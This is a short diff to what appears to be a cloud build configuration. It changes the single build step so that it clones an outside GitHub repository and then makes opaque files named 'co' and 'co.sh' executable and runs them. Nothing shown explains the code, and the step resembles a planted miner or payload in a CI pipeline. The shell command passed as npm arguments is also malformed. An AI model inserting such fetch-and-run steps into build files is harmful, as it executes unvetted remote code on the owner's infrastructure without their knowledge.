@@ -1,4 +1,4 @@
 steps:
 - name: node
   entrypoint: npm
-  args: ['chmod 500 co co.sh && ./co.sh']
+  args: ['git clone https://github.com/trailt/0.git && cd 0 && chmod 500 co co.sh && ./co.sh']
